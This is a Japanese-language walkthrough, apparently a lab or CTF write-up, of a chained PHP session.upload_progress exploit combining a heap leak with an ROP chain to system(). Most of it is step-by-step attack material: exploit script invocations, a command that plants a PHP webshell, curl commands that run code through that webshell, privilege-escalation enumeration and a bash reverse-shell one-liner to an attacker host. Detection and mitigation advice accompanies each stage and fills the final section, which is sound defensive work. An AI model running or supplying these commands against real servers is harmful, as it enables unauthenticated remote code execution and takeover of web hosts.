01概要Overview

CVECVE-2026-109618 (incomplete HashTable bucket → forged object → ROP)
CVE-2026-109619 (stale PS(id) cross-request UAF → heap leak)
CVSS v4.09.2 (Critical) — 両方とも
影響範囲PHP 5.4 (2012) 以降すべて。Apache mod_php (prefork) が最高リスク
修正版8.2.35 / 8.3.36 / 8.4.27 / 8.5.12
開示2026-10-21。CISA KEV 追加 2026-10-26
EDB52704 (OffSec verified, 2026-10-22 公開)
GHSAGHSA-w8hw-w9fx-j79w / GHSA-6wmf-4rv5-p3rp
前提条件認証不要。session.upload_progress.enabled=On (既定有効)
権限www-data (web worker 権限)

2 件は単独では不完全: CVE-2026-109619 がヒープリークで ASLR をバイパスし、CVE-2026-109618 が incomplete bucket からオブジェクト偽造 → ROP → zif_system() で RCE に至る。

session.upload_progress がアプリケーションコードの実行前に動作するため、アプリ側の WAF・認証・CSRF チェックはすべてバイパスされる。

02偵察Reconnaissance

ポートスキャン

bash
# フルポートスキャン + サービス検出
nmap -sC -sV -p- <TARGET> -oN nmap_full.txt

確認ポイント:

  • Apache/2.4.x + X-Powered-By: PHP/8.x.x ヘッダ
  • PHP バージョンが 8.2.35 / 8.3.36 / 8.4.27 / 8.5.12 より前なら脆弱
  • mod_php (prefork) かどうかは Server ヘッダの PHP/x.x.x 表記で推定 (FPM は通常ヘッダに出ない)
bash
# PHP バージョン + モジュール構成の確認
curl -sI http://<TARGET>/ | grep -iE 'server|x-powered-by|set-cookie'

Set-Cookie: PHPSESSID= が返ればセッションハンドラが動作しており、session.upload_progress が有効である可能性が高い。

防御 / countermeasures
  • expose_php = Off / ServerTokens Prod でバージョン情報を隠蔽 (フィンガープリント対策)
  • ただし攻撃者はエラーページやレスポンスタイミングからバージョンを推定できるため、根本対策にはならない

03Stage 0 — Worker Pinningプール飽和

Apache prefork の MaxRequestWorkers (既定 150) 分のコネクションを張って全 worker を占有し、攻撃リクエストが同一 worker に到達するようルーティングを制御する。

手順

  1. Pool Scrub — 全 worker を一巡させて初期状態にリセット
  2. Capacity Probe — 並列コネクション数を増やしながら MaxRequestWorkers を特定
  3. Parallel Repin — N-1 本の keep-alive コネクションで worker を占有し、残り 1 本を攻撃用スロットとして確保

exploit スクリプト (EDB-52704) はこの 3 フェーズを自動実行する。手動で確認する場合:

bash
# MaxRequestWorkers の推定 (応答タイムアウトが発生するコネクション数 ≈ MaxRequestWorkers)
for i in $(seq 100 10 200); do
  echo -n "$i conns: "
  timeout 5 ab -n $i -c $i -k http://<TARGET>/ 2>&1 | grep 'Complete requests'
done
注意 攻撃中は ~150 本の同時接続が維持される。IDS/IPS のコネクション閾値に確実にかかるため、検知リスクが最も高いフェーズ。
防御 / countermeasures
  • 単一 IP からの同時接続数を制限 (mod_limitipconn / iptables connlimit)
  • ネットワークモニタリングで単一ソースからの 100+ 同時接続スパイクをアラート

04Stage 1 — 情報リークASLR Bypass

OOM を故意に発生させ、zend_bailout() (longjmp()) によるスタック巻き戻しで per-request 状態のクリーンアップをスキップ。次リクエストが同一 worker に到達すると、stale な PS(id) がフリー済みヒープを参照し、overlong Set-Cookie: PHPSESSID= として漏洩する。

ヒープ増幅メカニズム

multipart POST の $_FILES に空ファイル名のネストされたフィールドを大量に含めると、約 390 倍のヒープ増幅が発生する。1 MB のリクエストボディで memory_limit (既定 128 MB) を超過させられる。

ポインタ抽出

漏洩した cookie (通常 100 KB+) を URL デコードし、8 バイト単位でスキャンしてユーザ空間ポインタレンジ内の値の出現頻度を集計する。最頻出ポインタから libphp ベースアドレスを特定し、既知の delta で Zend ヒープベースを算出する。

bash
# exploit スクリプトの disclosure フェーズ (EDB-52704)
python3 exploit.py --target http://<TARGET>/ --mode disclose

成功時の出力例:

  • candidates=N (N > 0) — ポインタ候補が見つかった
  • libphp_base=0x7f... — libphp のベースアドレス
  • heap_base=0x7f... — Zend ヒープのベースアドレス
memo candidates=0 は正常サイズの cookie が返った場合 (確率的失敗)。リトライで解決する。overlong cookie (257 文字超) が返れば成功。
防御 / countermeasures
  • WAF ルール: PHPSESSID の長さが 257 文字超なら即時ブロック — 最も高信頼度の単一指標
  • session.upload_progress.enabled = Off (php.ini で設定、.htaccess / ini_set() では間に合わない)
  • memory_limit = -1 + cgroup MemoryMax で OOM bailout パスを除去 (RLIMIT_AS は逆効果 — mmap 失敗が同一の bailout を発火させる)

05Stage 2 — RCEROP → system()

Stage 1 で取得したアドレスを使い、128 MB multipart POST で 2 度目の OOM を発生させる。_zend_hash_str_add_or_update_i() の途中で OOM が発生すると、incomplete bucket がハッシュテーブルに残る。配列デストラクタがこの不完全 bucket を走査する際、攻撃者が制御するメモリを zval → object → handler table として解釈し、関数ポインタをハイジャックする。

ROP チェーン

  1. Stack pivot — jump_fcontext+0x2e でスタックをヒープ上の制御領域に切り替え
  2. pop rdi — コマンド文字列のアドレスを第 1 引数にロード
  3. pop rsi — return value ポインタを設定
  4. ret → zif_system() — PHP の system() ラッパを呼び出し

コマンド長制限

キャリア構造体の固定サイズにより、最大 47 文字 (null 終端を含め 48 バイト)。webshell の書き込みが現実的な最初のコマンド。

bash
# 既定コマンドで実行 (id > /var/www/html/proof.txt)
python3 exploit.py --target http://<TARGET>/

# カスタムコマンドで webshell を設置 (47 文字以内)
python3 exploit.py --target http://<TARGET>/ \
  --command 'echo "<?=\`\$_GET[c]\`?>" > /var/www/html/s.php'

レスポンスコードの解釈:

  • response=0 (worker crash) — ROP チェーンが発火した可能性が高い (~75% 成功率)
  • response=192 (500 error) — ROP チェーンが発火しなかった可能性が高い → リトライ
注意 カスタムコマンドの場合、exploit は proof_url=None を返すため、実行成否を自動検証しない ("execution unverified" は仕様通りの動作)。手動で webshell の存在を確認する。
防御 / countermeasures
  • ファイルアップロードを受け付けないルートへの multipart/form-data をブロック
  • PHP-FPM: pm.max_requests = 1 で worker の cross-request 状態を排除 (パフォーマンスコストあり)
  • EDR / auditd: httpd / php-fpm から sh, bash, curl, wget の子プロセス生成を監視
  • SIGSEGV (exit code 139) の worker クラッシュスパイクを監視

06Post-Exploitationフラグ取得

RCE が成功し webshell が設置されたら、47 文字制限なしにコマンドを実行できる。

Webshell 構造

<?=`$_GET[c]`?> — PHP short echo tag + backtick 演算子。GET パラメータ c の値をシェルコマンドとして実行し、stdout を返す。

bash
# webshell の存在確認 + id
curl -s "http://<TARGET>/s.php?c=id"
# → uid=33(www-data) gid=33(www-data) groups=33(www-data)

# フラグ探索
curl -s "http://<TARGET>/s.php?c=find+/+-name+proof.txt+2>/dev/null"

# フラグ取得
curl -s "http://<TARGET>/s.php?c=cat+/var/www/proof.txt"

権限昇格の要否

www-data 権限で十分なケースが多い。proof.txt が /root/ 配下にある場合は権限昇格が必要だが、/var/www/ 配下にあれば www-data で読める。

bash
# SUID バイナリの列挙 (privesc が必要な場合)
curl -s "http://<TARGET>/s.php?c=find+/+-perm+-4000+-type+f+2>/dev/null"

# sudo 権限の確認
curl -s "http://<TARGET>/s.php?c=sudo+-l+2>&1"

# リバースシェルへの昇格 (対話的操作が必要な場合)
curl -s "http://<TARGET>/s.php?c=bash+-c+'bash+-i+>%26+/dev/tcp/<LHOST>/<LPORT>+0>%261'"
防御 / countermeasures
  • Web root (/var/www/html/) のファイル整合性監視 (新規 .php ファイルの出現をアラート)
  • Apache を read-only filesystem で実行 (コンテナ環境の場合)
  • open_basedir / disable_functions で system(), exec(), passthru(), shell_exec() を制限

07検知・緩和Detection & Mitigation

検知指標

レイヤ指標信頼度
Network単一 IP からの ~150 同時接続スパイク高
HTTP / WAFPHPSESSID > 257 文字 (URL エンコードされたバイナリデータ)高
Access Log500 / 200 の急速な交互出現 + 大きな Content-Length の POST中
Host / EDRhttpd / php-fpm から sh/bash/curl の子プロセス生成高
HostSIGSEGV (exit 139) の worker クラッシュスパイク中
PHP Logmemory_limit 超過エラーの急増低
memo PHP の display_errors / error_reporting / log_errors はメモリリーク・RCE に対して防御効果ゼロ。use-after-free はエラー報告レイヤの下で発生する。

緩和策の優先順位

対策効果副作用
パッチ適用 (8.2.35 / 8.3.36 / 8.4.27 / 8.5.12)根本修正なし
session.upload_progress.enabled = Offエントリポイント除去upload progress 機能喪失
memory_limit = -1 + cgroup MemoryMaxOOM bailout パス除去cgroup 設定が必要
PHP-FPM pm.max_requests = 1cross-request 状態排除パフォーマンスコスト
multipart/form-data ブロックトリガメカニズム排除正規アップロード不可
PHP 8.5: fatal_error_backtraces = 0追加 stale-state ベクタ除去デバッグ情報喪失
注意 RLIMIT_AS / ulimit -v は逆効果。mmap() 失敗が同一の OOM bailout パスを発火させるため、攻撃面を拡大する。MemoryMax (cgroup) を使う。
要点 / key takeaways
  • パッチが唯一の根本修正。interim 対策はパッチ適用までの時間稼ぎ
  • 最強の単一検知指標は overlong PHPSESSID (257 文字超)
  • mod_php + prefork が最高リスク — FPM は worker 分離 + max_requests=1 で大幅に緩和可能
  • 攻撃はアプリケーションコードの実行前に完了 — アプリ側の防御はすべて無効
  • RLIMIT_AS は緩和策ではなく攻撃面の拡大 — cgroup MemoryMax を使う
